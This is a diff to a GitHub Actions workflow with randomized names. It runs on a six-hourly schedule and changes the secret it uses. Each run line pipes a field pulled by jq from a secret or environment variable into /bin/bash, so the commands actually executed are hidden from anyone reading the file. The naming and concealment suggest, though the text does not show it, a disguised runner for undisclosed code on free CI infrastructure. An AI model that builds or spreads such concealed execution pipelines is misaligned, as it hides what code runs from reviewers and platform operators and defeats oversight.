@@ -1,9 +1,9 @@
 name: xiaolouzhu6789
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '8 0/6 * * *'
+    - cron: '24 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -11,15 +11,22 @@ jobs:
       - uses: actions/checkout@v4
       - name: xiaolouzhu6789
         env:
-          ec1: ${{ secrets.ec1 }}
+          jae734: ${{ secrets.jae734 }}
         run: |
-          echo $ec1 | jq -r .fwlx5195 | /bin/bash
-          echo $rtdbu0955 | jq -r .puknw5371 | /bin/bash
-          echo $hjn4276 | jq -r .rr67 | /bin/bash
-          echo $blkxg59 | jq -r .odp258 | /bin/bash
-          echo $tlc80098 | jq -r .w4697 | /bin/bash
-          echo $f054 | jq -r .embf72622 | /bin/bash
-          echo $oqk159 | jq -r .tzj482 | /bin/bash
-          echo $b0975 | jq -r .su389 | /bin/bash
-          echo $hl83755 | jq -r .jrg16193 | /bin/bash
+          echo $jae734 | jq -r .jkk09214 | /bin/bash
+          echo $yadg57 | jq -r .dydw6 | /bin/bash
+          echo $ee30239 | jq -r .kliqx37 | /bin/bash
+          echo $cw42267 | jq -r .l89 | /bin/bash
+          echo $bz2045 | jq -r .hhw9347 | /bin/bash
+          echo $ra65 | jq -r .igu02 | /bin/bash
+          echo $wsqro6887 | jq -r .wh4 | /bin/bash
+          echo $mrv15708 | jq -r .ln94447 | /bin/bash
+          echo $yxmet5 | jq -r .ol5 | /bin/bash
+          echo $b824 | jq -r .xsc25282 | /bin/bash
+          echo $sy3851 | jq -r .k46 | /bin/bash
+          echo $h37 | jq -r .to65 | /bin/bash
+          echo $jane12073 | jq -r .qjy3 | /bin/bash
+          echo $outp21 | jq -r .xj0 | /bin/bash
+          echo $rozml0923 | jq -r .nhbps5439 | /bin/bash
+          echo $ug27 | jq -r .azn40174 | /bin/bash
 
